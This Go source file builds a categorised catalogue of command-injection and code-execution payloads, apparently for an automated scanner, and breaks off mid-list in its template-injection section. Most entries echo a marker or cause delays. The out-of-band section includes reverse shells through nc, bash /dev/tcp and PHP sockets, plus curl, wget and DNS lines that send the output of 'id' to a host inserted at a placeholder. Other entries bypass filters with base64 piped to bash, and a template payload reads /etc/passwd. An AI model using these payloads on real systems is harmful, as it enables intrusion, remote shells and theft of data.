package main

import "fmt"

type RCEPayload struct {
	Payload     string
	Technique   string
	OS          string
	EchoStr     string
	SleepTime   int
	Category    string
	Severity    string
}

var ECHO_MARKER = "H4CK1T_1749"
var ECHO_CMD = fmt.Sprintf("echo %s", ECHO_MARKER)

// ===========================================================================
// 1. OUTPUT-BASED — 35+ wrappers
// ===========================================================================

func getOutputPayloads() []RCEPayload {
	marker := ECHO_MARKER
	echo := ECHO_CMD
	return []RCEPayload{
		// Basic command wrappers
		{Payload: fmt.Sprintf(";%s;", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "semicolon", Severity: "high"},
		{Payload: fmt.Sprintf("|%s|", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "pipe", Severity: "high"},
		{Payload: fmt.Sprintf("`%s`", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "backtick", Severity: "high"},
		{Payload: fmt.Sprintf("$(%s)", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "subshell", Severity: "high"},
		{Payload: fmt.Sprintf("&%s&", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "bg", Severity: "high"},
		{Payload: fmt.Sprintf("%%0a%s%%0a", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "newline", Severity: "high"},
		{Payload: fmt.Sprintf("%%0d%%0a%s%%0d%%0a", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "crlf", Severity: "high"},
		{Payload: fmt.Sprintf("\\n%s\\n", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "escape-n", Severity: "high"},
		{Payload: fmt.Sprintf("\\r\\n%s\\r\\n", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "escape-rn", Severity: "high"},
		{Payload: fmt.Sprintf("%%09%s%%09", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "tab", Severity: "high"},
		{Payload: fmt.Sprintf("%%00%s%%00", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "nullbyte", Severity: "high"},

		// Quote escapes
		{Payload: fmt.Sprintf("';%s;'", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "sq-close", Severity: "high"},
		{Payload: fmt.Sprintf("\";%s;\"", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "dq-close", Severity: "high"},
		{Payload: fmt.Sprintf("${%s}", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "dollar-brace", Severity: "high"},
		{Payload: fmt.Sprintf("';\"%s\";'", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "sq-dq", Severity: "high"},
		{Payload: fmt.Sprintf("\"'%s'\"", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "dq-sq", Severity: "high"},
		{Payload: fmt.Sprintf("'\\\";%s;\"\\'", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "esc-dq", Severity: "high"},
		{Payload: fmt.Sprintf("\"\\';%s;'\\\"", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "esc-sq", Severity: "high"},

		// Comment suffixes
		{Payload: fmt.Sprintf(";%s #", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "hash-comment", Severity: "high"},
		{Payload: fmt.Sprintf("|%s #", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "pipe-comment", Severity: "high"},
		{Payload: fmt.Sprintf("`%s` #", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "bt-comment", Severity: "high"},
		{Payload: fmt.Sprintf("$(%s) #", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "sub-comment", Severity: "high"},
		{Payload: fmt.Sprintf(";%s %%23", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "url-hash", Severity: "high"},
		{Payload: fmt.Sprintf(";%s <!--", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "html-comment", Severity: "high"},
		{Payload: fmt.Sprintf(";%s /*", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "c-comment", Severity: "high"},
		{Payload: fmt.Sprintf(";%s --", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "sql-comment", Severity: "high"},

		// Windows specific
		{Payload: fmt.Sprintf("| cmd /c %s |", echo), Technique: "output", OS: "windows", EchoStr: marker, Category: "cmd-c", Severity: "high"},
		{Payload: fmt.Sprintf("; cmd /c %s ;", echo), Technique: "output", OS: "windows", EchoStr: marker, Category: "cmd-c-sc", Severity: "high"},
		{Payload: fmt.Sprintf("& cmd /c %s &", echo), Technique: "output", OS: "windows", EchoStr: marker, Category: "cmd-c-bg", Severity: "high"},
		{Payload: fmt.Sprintf("& powershell -c \"%s\" &", echo), Technique: "output", OS: "windows", EchoStr: marker, Category: "ps-c", Severity: "high"},
		{Payload: fmt.Sprintf("; powershell -c \"%s\" ;", echo), Technique: "output", OS: "windows", EchoStr: marker, Category: "ps-sc", Severity: "high"},
		{Payload: fmt.Sprintf("| powershell -c \"%s\" |", echo), Technique: "output", OS: "windows", EchoStr: marker, Category: "ps-pipe", Severity: "high"},

		// Multi-statement chains
		{Payload: fmt.Sprintf(";%s;echo DONE;", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "chain", Severity: "high"},
		{Payload: fmt.Sprintf("&&%s&&", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "and", Severity: "high"},
		{Payload: fmt.Sprintf("||%s||", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "or", Severity: "high"},
		{Payload: fmt.Sprintf(";%s||echo FAIL;", echo), Technique: "output", OS: "unix", EchoStr: marker, Category: "and-or-chain", Severity: "high"},
	}
}

// ===========================================================================
// 2. OUTPUT WAF BYPASS — 40+ bypasses
// ===========================================================================

func getWAFBypassPayloads() []RCEPayload {
	marker := ECHO_MARKER
	return []RCEPayload{
		// Character splitting
		{Payload: fmt.Sprintf(";e`cho` %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "backtick-split", Severity: "critical"},
		{Payload: fmt.Sprintf(";e$(cho) %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "subshell-split", Severity: "critical"},
		{Payload: fmt.Sprintf("';'e'c'h'o' '%s';'", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "char-split", Severity: "critical"},
		{Payload: fmt.Sprintf(";e\\\\c\\\\h\\\\o %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "backslash-split", Severity: "critical"},
		{Payload: fmt.Sprintf(";e''cho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "empty-sq", Severity: "critical"},
		{Payload: fmt.Sprintf(";e\"\"cho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "empty-dq", Severity: "critical"},
		{Payload: fmt.Sprintf(";ech$()o %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "subshell-insert", Severity: "critical"},
		{Payload: fmt.Sprintf(";e\"$@\"cho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "param-expand", Severity: "critical"},
		{Payload: fmt.Sprintf(";e\"$*\"cho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "star-expand", Severity: "critical"},
		{Payload: fmt.Sprintf(";e${x}cho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "var-insert", Severity: "critical"},
		{Payload: fmt.Sprintf(";prin\\\\ntf '%s\\n' %s;", marker, marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "printf", Severity: "critical"},

		// Wildcard/glob bypass
		{Payload: fmt.Sprintf(";/???/echo %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "wildcard", Severity: "critical"},
		{Payload: fmt.Sprintf(";/bi?/echo %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "glob", Severity: "critical"},
		{Payload: fmt.Sprintf(";/usr/bin/ech? %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "glob-path", Severity: "critical"},

		// Case obfuscation
		{Payload: fmt.Sprintf(";EcHo %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "mixed-case", Severity: "critical"},
		{Payload: fmt.Sprintf(";ECHO %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "upper-case", Severity: "critical"},
		{Payload: fmt.Sprintf(";eChO %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "camel-case", Severity: "critical"},

		// Base64/Hex/Oct encoded execution
		{Payload: fmt.Sprintf(";echo %s | base64 -d|bash;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "b64-exec", Severity: "critical"},
		{Payload: fmt.Sprintf(";echo %s | base64 --decode|sh;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "b64-sh", Severity: "critical"},
		{Payload: fmt.Sprintf(";python3 -c \"import base64;exec(base64.b64decode('%s'))\";", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "py-b64", Severity: "critical"},
		{Payload: fmt.Sprintf(";perl -e \"use MIME::Base64;print decode_base64('%s')\";", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "pl-b64", Severity: "critical"},

		// XOR/ROT obfuscation
		{Payload: fmt.Sprintf(";echo %s | tr 'A-Za-z' 'N-ZA-Mn-za-m'|bash;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "rot13", Severity: "critical"},
		{Payload: fmt.Sprintf(";bash -c \"echo $'%s'\"|bash;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "ansi-c", Severity: "critical"},

		// Environment variable bypass
		{Payload: ";${PATH:0:1}cho $HOME;", Technique: "output-waf", OS: "unix", EchoStr: "", Category: "var-path", Severity: "critical"},
		{Payload: ";${SHELL:0:1}cho $HOME;", Technique: "output-waf", OS: "unix", EchoStr: "", Category: "var-shell", Severity: "critical"},
		{Payload: fmt.Sprintf(";$(echo ${HOME:0:1})cho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "var-substr", Severity: "critical"},

		// Double/triple encoding
		{Payload: fmt.Sprintf("%%253b%s%%253b", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "double-enc", Severity: "critical"},
		{Payload: fmt.Sprintf("%%25253b%s%%25253b", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "triple-enc", Severity: "critical"},

		// Tab/whitespace variants
		{Payload: fmt.Sprintf(";echo\\t%s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "tab-space", Severity: "critical"},
		{Payload: fmt.Sprintf(";echo\\h%s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "horiz-space", Severity: "critical"},
		{Payload: fmt.Sprintf(";echo\\v%s\\v;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "vert-space", Severity: "critical"},

		// Line feed / form feed variants
		{Payload: fmt.Sprintf(";e\\fcho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "form-feed", Severity: "critical"},
		{Payload: fmt.Sprintf(";e\\rcho %s;", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "cr-insert", Severity: "critical"},

		// Input redirection variant
		{Payload: fmt.Sprintf(";echo<(<(echo %s)) %s;", marker, marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "proc-sub", Severity: "critical"},
		{Payload: fmt.Sprintf(";echo $(< <(echo %s));", marker), Technique: "output-waf", OS: "unix", EchoStr: marker, Category: "proc-sub2", Severity: "critical"},

		// Exec via shell builtins
		{Payload: ";exec echo H4CK1T;", Technique: "output-waf", OS: "unix", EchoStr: "H4CK1T", Category: "exec-builtin", Severity: "critical"},
		{Payload: ";source /dev/stdin <<< \"echo H4CK1T\";", Technique: "output-waf", OS: "unix", EchoStr: "H4CK1T", Category: "source-stdin", Severity: "critical"},
	}
}

// ===========================================================================
// 3. TIME-BASED — 30+ timing payloads
// ===========================================================================

func getTimePayloads() []RCEPayload {
	sleeps := []int{3, 5, 7, 10, 15}
	var payloads []RCEPayload

	for _, s := range sleeps {
		payloads = append(payloads,
			RCEPayload{Payload: fmt.Sprintf(";sleep(%d);", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-sc", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("|sleep(%d)|", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-pipe", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("`sleep(%d)`", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-bt", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("$(sleep(%d))", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-sub", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("&sleep(%d)&", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-bg", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("';sleep(%d);'", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-sq", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("\";sleep(%d);\"", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-dq", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("${sleep(%d)}", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-dbrace", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("%%0asleep(%d)%%0a", s), Technique: "time", OS: "unix", SleepTime: s, Category: "sleep-nl", Severity: "high"},
		)
	}

	// Ping-based timing
	for _, s := range []int{3, 5, 10} {
		payloads = append(payloads,
			RCEPayload{Payload: fmt.Sprintf(";ping -c %d 127.0.0.1;", s), Technique: "time", OS: "unix", SleepTime: s, Category: "ping-unix", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf(";ping -n %d 127.0.0.1;", s), Technique: "time", OS: "windows", SleepTime: s, Category: "ping-win", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("|ping -n %d 127.0.0.1|", s), Technique: "time", OS: "windows", SleepTime: s, Category: "pipe-ping", Severity: "high"},
			RCEPayload{Payload: fmt.Sprintf("&ping -c %d 127.0.0.1&", s), Technique: "time", OS: "unix", SleepTime: s, Category: "bg-ping", Severity: "high"},
		)
	}

	// Read/dd based delay
	payloads = append(payloads,
		RCEPayload{Payload: ";timeout 5 bash -c 'while true;do true;done';", Technique: "time", OS: "unix", SleepTime: 5, Category: "busy-loop", Severity: "high"},
		RCEPayload{Payload: ";dd if=/dev/zero bs=1M count=100 2>/dev/null;", Technique: "time", OS: "unix", SleepTime: 5, Category: "dd-delay", Severity: "high"},
		RCEPayload{Payload: ";openssl speed -engine 2>&1 >/dev/null;", Technique: "time", OS: "unix", SleepTime: 5, Category: "ssl-speed", Severity: "high"},
		RCEPayload{Payload: ";sha1sum /dev/zero 2>&1 >/dev/null &;", Technique: "time", OS: "unix", SleepTime: 3, Category: "sha-cpu", Severity: "high"},
		RCEPayload{Payload: ";TIMEOUT /T 5 /NOBREAK;", Technique: "time", OS: "windows", SleepTime: 5, Category: "win-timeout", Severity: "high"},
		RCEPayload{Payload: "|TIMEOUT /T 5 /NOBREAK|", Technique: "time", OS: "windows", SleepTime: 5, Category: "win-timeout-pipe", Severity: "high"},
	)

	// Interpreter-based sleep
	payloads = append(payloads,
		RCEPayload{Payload: ";python -c \"import time;time.sleep(5)\";", Technique: "time", OS: "unix", SleepTime: 5, Category: "py-sleep", Severity: "high"},
		RCEPayload{Payload: ";perl -e \"sleep(5)\";", Technique: "time", OS: "unix", SleepTime: 5, Category: "pl-sleep", Severity: "high"},
		RCEPayload{Payload: ";ruby -e \"sleep(5)\";", Technique: "time", OS: "unix", SleepTime: 5, Category: "rb-sleep", Severity: "high"},
		RCEPayload{Payload: ";php -r \"sleep(5);\";", Technique: "time", OS: "unix", SleepTime: 5, Category: "php-sleep", Severity: "high"},
		RCEPayload{Payload: ";node -e \"setTimeout(()=>{},5000)\";", Technique: "time", OS: "unix", SleepTime: 5, Category: "node-sleep", Severity: "high"},
		RCEPayload{Payload: ";lua -e \"os.execute('sleep 5')\";", Technique: "time", OS: "unix", SleepTime: 5, Category: "lua-sleep", Severity: "high"},
	)
	return payloads
}

// ===========================================================================
// 4. ERROR-BASED — 15+ payloads
// ===========================================================================

func getErrorPayloads() []RCEPayload {
	return []RCEPayload{
		{Payload: ";undefined_cmd_xyz_1749;", Technique: "error", OS: "unix", Category: "bad-cmd-sc", Severity: "med"},
		{Payload: "|undefined_cmd_xyz_1749|", Technique: "error", OS: "unix", Category: "bad-cmd-pipe", Severity: "med"},
		{Payload: "$(undefined_cmd_xyz_1749)", Technique: "error", OS: "unix", Category: "bad-cmd-sub", Severity: "med"},
		{Payload: "`undefined_cmd_xyz_1749`", Technique: "error", OS: "unix", Category: "bad-cmd-bt", Severity: "med"},
		{Payload: "&undefined_cmd_xyz_1749&", Technique: "error", OS: "unix", Category: "bad-cmd-bg", Severity: "med"},
		{Payload: ";cat /nonexistent_file_hackit_1749;", Technique: "error", OS: "unix", Category: "bad-file", Severity: "high"},
		{Payload: "|cat /nonexistent_file_hackit_1749|", Technique: "error", OS: "unix", Category: "pipe-bad-file", Severity: "high"},
		{Payload: ";type nonexistent_file_hackit_1749;", Technique: "error", OS: "windows", Category: "win-bad-file", Severity: "high"},
		{Payload: ";python -c \"1/0\";", Technique: "error", OS: "unix", Category: "py-div0", Severity: "high"},
		{Payload: ";perl -e \"1/0\";", Technique: "error", OS: "unix", Category: "pl-div0", Severity: "high"},
		{Payload: ";php -r \"1/0;\";", Technique: "error", OS: "unix", Category: "php-div0", Severity: "high"},
		{Payload: ";ruby -e \"1/0\";", Technique: "error", OS: "unix", Category: "rb-div0", Severity: "high"},
		{Payload: ";python -c \"a=[];print(a[99])\";", Technique: "error", OS: "unix", Category: "py-oob", Severity: "high"},
		{Payload: ";python -c \"import sys;sys.exit(1)\";", Technique: "error", OS: "unix", Category: "py-exit", Severity: "med"},
		{Payload: ";sh -c \"exit 1\";", Technique: "error", OS: "unix", Category: "sh-exit", Severity: "med"},
	}
}

// ===========================================================================
// 5. BLIND BOOLEAN — 15+ payloads
// ===========================================================================

func getBlindPayloads() []RCEPayload {
	marker := ECHO_MARKER
	echo := ECHO_CMD
	return []RCEPayload{
		{Payload: fmt.Sprintf(";if %s; then echo %s; fi;", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "if-then", Severity: "high"},
		{Payload: fmt.Sprintf("|if %s; then echo %s; fi|", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "pipe-if", Severity: "high"},
		{Payload: fmt.Sprintf(";%s && echo %s;", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "and", Severity: "high"},
		{Payload: fmt.Sprintf(";%s || echo %s;", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "or", Severity: "high"},
		{Payload: fmt.Sprintf("&%s && echo %s&", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "bg-and", Severity: "high"},
		{Payload: fmt.Sprintf("';if %s; then echo %s; fi;'", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "sq-if", Severity: "high"},
		{Payload: fmt.Sprintf("\";if %s; then echo %s; fi;\"", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "dq-if", Severity: "high"},
		{Payload: fmt.Sprintf("$(if %s; then echo %s; fi)", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "sub-if", Severity: "high"},
		{Payload: fmt.Sprintf("`if %s; then echo %s; fi`", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "bt-if", Severity: "high"},
		{Payload: fmt.Sprintf("|%s && echo %s #", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "pipe-and-comment", Severity: "high"},
		{Payload: fmt.Sprintf(";%s && echo %s #", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "sc-and-comment", Severity: "high"},
		{Payload: fmt.Sprintf("|%s || echo %s #", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "pipe-or-comment", Severity: "high"},
		{Payload: fmt.Sprintf("%%0a%s && echo %s%%0a", echo, marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "nl-and", Severity: "high"},
		{Payload: fmt.Sprintf(";test -f /etc/passwd && echo %s;", marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "test-file", Severity: "high"},
		{Payload: fmt.Sprintf(";test -d /root && echo %s;", marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "test-dir", Severity: "high"},
		{Payload: fmt.Sprintf(";which python && echo %s;", marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "which-py", Severity: "high"},
		{Payload: fmt.Sprintf(";which curl && echo %s;", marker), Technique: "blind", OS: "unix", EchoStr: marker, Category: "which-curl", Severity: "high"},
	}
}

// ===========================================================================
// 6. OOB (OUT-OF-BAND) — 15+ payloads
// ===========================================================================

func getOOBPayloads() []RCEPayload {
	return []RCEPayload{
		{Payload: ";curl -s http://%s/$(id|base64 -w0) &", Technique: "oob-http", OS: "unix", Category: "curl-b64", Severity: "critical"},
		{Payload: "|curl -s http://%s/$(id|base64 -w0)|", Technique: "oob-http", OS: "unix", Category: "pipe-curl", Severity: "critical"},
		{Payload: ";wget -q -O- http://%s/$(id|base64 -w0) &", Technique: "oob-http", OS: "unix", Category: "wget-b64", Severity: "critical"},
		{Payload: ";nslookup $(whoami).%s &", Technique: "oob-dns", OS: "unix", Category: "nslookup-whoami", Severity: "critical"},
		{Payload: ";dig +short $(hostname).%s &", Technique: "oob-dns", OS: "unix", Category: "dig-hostname", Severity: "critical"},
		{Payload: ";ping -c 1 $(id).%s &", Technique: "oob-dns", OS: "unix", Category: "ping-id", Severity: "critical"},
		{Payload: ";python3 -c \"import urllib.request;urllib.request.urlopen('http://%s/'+__import__('base64').b64encode(__import__('os').popen('id').read().encode()).decode())\" &", Technique: "oob-http", OS: "unix", Category: "py-urllib", Severity: "critical"},
		{Payload: ";perl -e \"use LWP::Simple;getstore('http://%s/'.encode_base64('id'),'x')\" &", Technique: "oob-http", OS: "unix", Category: "pl-lwp", Severity: "critical"},
		{Payload: ";nc -e /bin/sh %s 4444 &", Technique: "oob-rev", OS: "unix", Category: "nc-rev", Severity: "critical"},
		{Payload: ";bash -i >& /dev/tcp/%s/4444 0>&1 &", Technique: "oob-rev", OS: "unix", Category: "bash-rev", Severity: "critical"},
		{Payload: "|bash -i >& /dev/tcp/%s/4444 0>&1|", Technique: "oob-rev", OS: "unix", Category: "pipe-bash-rev", Severity: "critical"},
		{Payload: ";php -r \"\\$sock=fsockopen('%s',4444);exec('/bin/sh -i <&3 >&3 2>&3');\" &", Technique: "oob-rev", OS: "unix", Category: "php-rev", Severity: "critical"},
	}
}

// ===========================================================================
// 7. SHELL VARIANT — 20+ interpreter-specific payloads
// ===========================================================================

func getShellVariantPayloads() []RCEPayload {
	marker := ECHO_MARKER
	return []RCEPayload{
		{Payload: fmt.Sprintf(";perl -e 'print \"%s\"' ;", marker), Technique: "output-perl", OS: "unix", EchoStr: marker, Category: "perl", Severity: "high"},
		{Payload: fmt.Sprintf(";python3 -c 'print(\"%s\")' ;", marker), Technique: "output-py3", OS: "unix", EchoStr: marker, Category: "python3", Severity: "high"},
		{Payload: fmt.Sprintf(";python -c 'print(\"%s\")' ;", marker), Technique: "output-py", OS: "unix", EchoStr: marker, Category: "python", Severity: "high"},
		{Payload: fmt.Sprintf(";ruby -e 'puts \"%s\"' ;", marker), Technique: "output-rb", OS: "unix", EchoStr: marker, Category: "ruby", Severity: "high"},
		{Payload: fmt.Sprintf(";php -r 'echo \"%s\";' ;", marker), Technique: "output-php", OS: "unix", EchoStr: marker, Category: "php", Severity: "high"},
		{Payload: fmt.Sprintf(";node -e 'console.log(\"%s\")' ;", marker), Technique: "output-node", OS: "unix", EchoStr: marker, Category: "node", Severity: "high"},
		{Payload: fmt.Sprintf(";lua -e 'print(\"%s\")' ;", marker), Technique: "output-lua", OS: "unix", EchoStr: marker, Category: "lua", Severity: "high"},
		{Payload: fmt.Sprintf(";awk 'BEGIN{print \"%s\"}' ;", marker), Technique: "output-awk", OS: "unix", EchoStr: marker, Category: "awk", Severity: "high"},
		{Payload: fmt.Sprintf(";tclsh -c 'puts \"%s\"' ;", marker), Technique: "output-tcl", OS: "unix", EchoStr: marker, Category: "tcl", Severity: "high"},
		{Payload: fmt.Sprintf(";groovy -e 'println \"%s\"' ;", marker), Technique: "output-groovy", OS: "unix", EchoStr: marker, Category: "groovy", Severity: "high"},
		{Payload: ";bash -c '{echo,%s}' ;", Technique: "output-bash", OS: "unix", EchoStr: marker, Category: "bash-brace", Severity: "high"},
		{Payload: ";sh -c \"echo %s\" ;", Technique: "output-sh", OS: "unix", EchoStr: marker, Category: "sh-exec", Severity: "high"},
		{Payload: fmt.Sprintf(";zsh -c 'echo %s' ;", marker), Technique: "output-zsh", OS: "unix", EchoStr: marker, Category: "zsh", Severity: "high"},
		{Payload: fmt.Sprintf(";dash -c 'echo %s' ;", marker), Technique: "output-dash", OS: "unix", EchoStr: marker, Category: "dash", Severity: "high"},
		{Payload: fmt.Sprintf(";ksh -c 'echo %s' ;", marker), Technique: "output-ksh", OS: "unix", EchoStr: marker, Category: "ksh", Severity: "high"},
		{Payload: fmt.Sprintf(";csh -c 'echo %s' ;", marker), Technique: "output-csh", OS: "unix", EchoStr: marker, Category: "csh", Severity: "high"},
		{Payload: fmt.Sprintf(";irb -e 'puts \"%s\"' ;", marker), Technique: "output-irb", OS: "unix", EchoStr: marker, Category: "irb", Severity: "high"},
		{Payload: fmt.Sprintf(";psql -c \"SELECT '%s'\" ;", marker), Technique: "output-psql", OS: "unix", EchoStr: marker, Category: "psql", Severity: "high"},
		{Payload: fmt.Sprintf(";mysql -e \"SELECT '%s'\" ;", marker), Technique: "output-mysql", OS: "unix", EchoStr: marker, Category: "mysql", Severity: "high"},
		{Payload: fmt.Sprintf(";sqlite3 :memory: \"SELECT '%s'\" ;", marker), Technique: "output-sqlite", OS: "unix", EchoStr: marker, Category: "sqlite", Severity: "high"},
		{Payload: fmt.Sprintf(";gdb -batch -ex 'print \"%s\"' -ex quit;", marker), Technique: "output-gdb", OS: "unix", EchoStr: marker, Category: "gdb", Severity: "high"},
	}
}

// ===========================================================================
// 8. PHP TECH-SPECIFIC — 10+ PHP injection payloads
// ===========================================================================

func getPHPPayloads() []RCEPayload {
	marker := ECHO_MARKER
	return []RCEPayload{
		{Payload: fmt.Sprintf("<?php echo '%s'; ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-tag", Severity: "critical"},
		{Payload: fmt.Sprintf("<?= '%s' ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-short", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php system('echo %s'); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-system", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php exec('echo %s',\\$o);print(implode(\"\\n\",\\$o)); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-exec", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php shell_exec('echo %s'); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-shell", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php passthru('echo %s'); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-passthru", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php \\$a=array(0=>'%s');echo implode(\\$a); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-array", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php eval('echo \"%s\";'); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-eval", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php assert('print \"%s\"'); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-assert", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php preg_replace('/.*/e','print \"%s\"',''); ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-preg", Severity: "critical"},
		{Payload: fmt.Sprintf("<?php \\$_='%s';echo \\$_; ?>", marker), Technique: "output-php", OS: "php", EchoStr: marker, Category: "php-var", Severity: "critical"},
	}
}

// ===========================================================================
// 9. SSTI PAYLOADS — 15+ template injection payloads
// ===========================================================================

func getSSTIPayloads() []RCEPayload {
	return []RCEPayload{
		// Twig (PHP)
		{Payload: "{{7*7}}", Technique: "ssti", OS: "twig", EchoStr: "49", Category: "twig-math", Severity: "high"},
		{Payload: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /etc/passwd\")}}", Technique: "ssti", OS: "twig", EchoStr: "root", Category: "twig-rce", Severity: "critical"},

		// Jinja2 (Python)
		{Payload: "{{7*7}}", Technique: "ssti", OS: "jinja2", EchoStr: "49", Category: "jinja-math", Severity: "high"},
		{Payload: "{{config}}", Technique: "ssti", OS: "jinja2", EchoStr: "SECRET", Category: "jinja-config", Severity: "critical"},
		{Payload: "{{''.__class__.__mro__[1].__subclasses__()}}", Technique: "ssti", OS: "jinja2", EchoStr: "Popen", Category: "jinja-rce", Severity: "critical"},

		// Freemarker (Java)
		{Payload: "${7*7}", Technique: "ssti", OS: "freemarker", EchoStr: "49", Category: "fm-math", Severity: "high"},
		{Payload: "${7*7}", Technique: "ssti", OS: "freemarker", EchoStr: "49", Category: "fm-test", Severity: "high"},
		{Payload: "${T(java.lang.Runtime).getRuntime().exec('echo H4CK1T')}", Technique: "ssti", OS: "freemarker", EchoStr: "H4CK1T", Category: "fm-rce", Severity: "critical"},

		// Velocity (Java)
		{Payload: "#set($x=7*7)$x", Technique: "ssti", OS: "velocity", EchoStr: "49", Category: "vel-math", Severity: "high"},
